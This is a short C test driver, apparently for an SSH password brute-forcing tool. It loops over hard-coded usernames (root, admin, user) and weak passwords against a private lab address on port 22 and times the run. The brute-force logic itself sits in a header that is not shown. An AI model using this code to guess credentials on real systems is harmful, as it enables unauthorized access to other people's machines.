#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/time.h>
#include <time.h>

#include "ssh_brute.h"

static int futex_result = 1;

static void only_passwords_parallel(void)
{
	char *passwords[] = {
		"lalalala",
		"lololo",
		"1",
		"qwerty123",
		"dog777"
	};
	int passwords_count = 5;

	char *users[] = {
		"root",
		"nester",
		"user",
		"admin"
	};
	size_t users_count = 4;

	int completed = 0;

	struct ssh_username_options uo = {
		.host = "192.168.122.190",
		.username = NULL,
		.port = 22,
		.passwords = passwords,
		.pcount = passwords_count,
		.completed = &completed,
		.futex_result = &futex_result,
	};

	clock_t start, end;
	double cpu_time_used;

	int i;

	printf("\n\n\n lets start only passwords parallel test\n\n\n");
	start = clock();
	for (i = 0; i < users_count; i++) {
		uo.username = users[i];
		user_connection_thread(&uo);
	}
	end = clock();
	cpu_time_used = ((double)(end - start)) / CLOCKS_PER_SEC;
	printf("\n\n\nOnly passwords parallel %f\n\n\n", cpu_time_used);
}

int main(int argc, const char *argv[])
{

	only_passwords_parallel();
	return 0;
}
